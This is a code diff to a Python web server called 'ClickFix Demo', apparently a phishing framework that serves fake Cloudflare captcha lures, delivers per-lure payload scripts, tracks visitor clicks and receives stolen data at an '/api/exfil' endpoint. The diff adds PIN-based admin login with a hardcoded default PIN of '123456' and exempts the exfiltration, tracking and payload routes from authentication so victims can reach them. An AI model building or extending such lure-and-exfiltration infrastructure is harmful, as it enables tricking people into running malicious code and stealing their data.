@@ -58,11 +58,12 @@ class ConfigManager:
 
     def _defaults(self) -> Dict:
         return {
-            "app": {"name": "ClickFix Demo", "version": "2.0.0", "debug": False},
+            "app": {"name": "ClickFix Demo", "version": "3.0.0", "debug": False},
             "server": {"host": "0.0.0.0", "port": 8080},
             "payload": {"enabled": True, "default_script": "default.js", "per_lure": True},
             "tracking": {"enabled": True, "log_visits": True, "log_clicks": True},
-            "lures": {"default": "captcha", "auto_discover": True},
+            "lures": {"default": "cloudflare_captcha", "auto_discover": True},
+            "admin": {"auth_required": True, "pin": "123456"},
         }
 
     def _persist_main(self):
@@ -225,6 +226,45 @@ async def _serve_lure(request: Request, lure_name: str, lure_config: Dict) -> HT
     return _generate_dynamic_html(ctx)
 
 
+# ─── Admin Authentication ──────────────────────────────────────────────────────
+
+import secrets
+
+current_session_token = secrets.token_hex(32)
+
+def is_authenticated(request: Request) -> bool:
+    admin_cfg = config_manager.main.get("admin", {})
+    if not admin_cfg.get("auth_required", True):
+        return True
+    
+    pin_config = admin_cfg.get("pin", "123456")
+    if not pin_config:
+        return True
+        
+    cookie_token = request.cookies.get("admin_session")
+    return cookie_token == current_session_token
+
+
+@app.middleware("http")
+async def admin_auth_middleware(request: Request, call_next):
+    path = request.url.path
+    method = request.method
+    
+    is_admin_route = path.startswith("/admin") and path not in ["/admin/login", "/admin/logout"]
+    is_admin_api = path.startswith("/api/") and not (
+        path == "/api/track" or 
+        (path == "/api/exfil" and method == "POST") or
+        path.startswith("/api/payloads")
+    )
+    
+    if (is_admin_route or is_admin_api) and not is_authenticated(request):
+        if is_admin_api:
+            return JSONResponse({"detail": "Không có quyền truy cập"}, status_code=401)
+        return RedirectResponse(url="/admin/login", status_code=307)
+        
+    return await call_next(request)
+
+
 # ─── Routes ───────────────────────────────────────────────────────────────────
 
 @app.get("/favicon.ico")
@@ -326,6 +366,52 @@ async def get_payload(name: str):
 @app.get("/api/logs")
 async def get_logs():
     return JSONResponse({"total": len(visit_log), "visits": visit_log[-200:]})
+
+
+@app.get("/admin/login", response_class=HTMLResponse)
+async def admin_login_get(request: Request):
+    if is_authenticated(request):
+        return RedirectResponse(url="/admin", status_code=303)
+    return jinja.TemplateResponse(request, "admin_login.html", {"request": request, "error": False})
+
+
+@app.post("/admin/login")
+async def admin_login_post(request: Request):
+    body = await request.body()
+    params = {}
+    for pair in body.decode("utf-8").split("&"):
+        if "=" in pair:
+            k, v = pair.split("=", 1)
+            # URL unquoting for values (simple replacement for form parameters)
+            v = v.replace("+", " ")
+            import urllib.parse
+            v = urllib.parse.unquote(v)
+            params[k] = v
+            
+    pin = params.get("pin", "")
+    expected_pin = config_manager.main.get("admin", {}).get("pin", "123456")
+    
+    if pin == expected_pin:
+        response = RedirectResponse(url="/admin", status_code=303)
+        response.set_cookie(
+            "admin_session", 
+            current_session_token, 
+            httponly=True, 
+            samesite="lax"
+        )
+        return response
+        
+    return jinja.TemplateResponse(request, "admin_login.html", {
+        "request": request,
+        "error": True
+    })
+
+
+@app.get("/admin/logout")
+async def admin_logout(request: Request):
+    response = RedirectResponse(url="/admin/login", status_code=303)
+    response.delete_cookie("admin_session")
+    return response
 
 
 @app.get("/admin", response_class=HTMLResponse)
